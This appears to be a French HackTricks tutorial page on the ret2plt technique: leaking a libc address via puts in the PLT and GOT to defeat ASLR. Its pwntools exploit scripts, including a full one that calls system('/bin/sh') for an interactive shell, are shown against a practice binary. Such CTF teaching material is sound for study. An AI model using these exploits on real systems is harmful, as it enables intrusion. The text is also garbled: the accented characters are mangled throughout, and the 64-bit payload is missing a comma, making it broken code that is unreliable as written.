# Ret2plt

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Informations de base

L'objectif de cette technique serait de **fuite une adresse d'une fonction du PLT** pour pouvoir contourner l'ASLR. Cela est d√ª au fait que si, par exemple, vous fuyez l'adresse de la fonction `puts` de la libc, vous pouvez ensuite **calculer o√π se trouve la base de `libc`** et calculer les d√©calages pour acc√©der √† d'autres fonctions telles que **`system`**.

Cela peut √™tre fait avec une charge utile `pwntools` telle que ([**√† partir d'ici**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Notez comment **`puts`** (en utilisant l'adresse du PLT) est appel√© avec l'adresse de `puts` situ√©e dans le `GOT`. Cela est d√ª au fait qu'au moment o√π `puts` imprime l'entr√©e `GOT` de puts, cette **entr√©e contiendra l'adresse de `puts` en m√©moire**.

Notez √©galement comment l'adresse de `main` est utilis√©e dans l'exploit afin que lorsque `puts` termine son ex√©cution, le **binaire rappelle `main` au lieu de se terminer** (ainsi l'adresse divulgu√©e restera valide).

{% hint style="danger" %}
Notez que pour que cela fonctionne, le **binaire ne doit pas √™tre compil√© avec PIE** ou vous devez avoir **trouv√© une fuite pour contourner PIE** afin de conna√Ætre l'adresse du `PLT`, `GOT` et `main`.
{% endhint %}

Vous pouvez trouver un [**exemple complet de ce contournement ici**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). C'√©tait l'exploit final de cet exemple:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## Autres exemples et R√©f√©rences

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bits, ASLR activ√© mais pas de PIE, la premi√®re √©tape consiste √† remplir un d√©passement de tampon jusqu'au byte 0x00 du canary pour ensuite appeler puts et le divulguer. Avec le canary, un gadget ROP est cr√©√© pour appeler puts afin de divulguer l'adresse de puts depuis la GOT, puis un gadget ROP pour appeler `system('/bin/sh')`.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bits, ASLR activ√©, pas de canary, d√©passement de pile dans main √† partir d'une fonction enfant. Gadget ROP pour appeler puts afin de divulguer l'adresse de puts depuis la GOT, puis appeler un gadget one.
